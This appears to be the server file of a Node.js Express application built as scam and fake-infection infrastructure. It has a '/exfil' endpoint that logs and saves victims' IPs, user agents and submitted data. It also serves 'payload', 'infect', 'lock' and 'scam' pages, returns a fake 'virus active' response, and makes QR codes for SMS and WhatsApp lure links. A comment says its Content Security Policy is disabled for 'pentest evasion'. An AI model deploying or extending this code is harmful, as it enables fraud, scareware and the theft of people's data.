const express = require('express');
const path = require('path');
const compression = require('compression');
const helmet = require('helmet');
const app = express();
const PORT = process.env.PORT || 3000;

// Security headers for pentest evasion
app.use(helmet({
    contentSecurityPolicy: false, // Disable CSP for full JS execution
    referrerPolicy: false
}));

app.use(compression());
app.use(express.static('public'));

// Data exfiltration endpoint
app.post('/exfil', express.json({limit: '10mb'}), (req, res) => {
    const data = req.body;
    console.log('🕵️ EXFIL DATA:', {
        ip: req.ip,
        userAgent: req.get('User-Agent'),
        data: data
    });
    
    // Save to file for analysis
    const fs = require('fs');
    const timestamp = new Date().toISOString();
    fs.appendFileSync('exfil.log', `${timestamp} - ${req.ip} - ${JSON.stringify(data)}\n`);
    
    res.json({status: 'success', message: 'Data received'});
});

// Payload delivery endpoints
app.get('/payload', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/infect', (req, res) => {
    // Obfuscated redirect to payload
    res.redirect('/payload');
});

app.get('/lock', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Fake callback for SMS/WA clicks
app.post('/callback', (req, res) => {
    console.log('📱 Callback hit:', req.ip, req.body);
    res.json({error: 'Connection failed - virus active'});
});

// Health check
app.get('/health', (req, res) => {
    res.json({status: 'infected', infections: Math.floor(Math.random()*1000)});
});

app.get('/scam', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'scam.html'));
});

app.get('/qr', (req, res) => {
    const link = req.query.url || 'http://localhost:3000/lock';
    res.redirect(`https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=${encodeURIComponent(link)}`);

});

app.listen(PORT, () => {
    console.log(`🚨 INFECT SERVER LIVE: http://localhost:3000`);
    console.log(`📱 Payload: http://localhost:3000/payload`);
    console.log(`🔗 Infect link: http://localhost:3000/infect`);
    console.log('📱 Prank links:');
    console.log('SMS: http://localhost:3000/scam');
    console.log('QR:  http://localhost:3000/qr');
    console.log('Lock:http://localhost:3000/lock');
}); 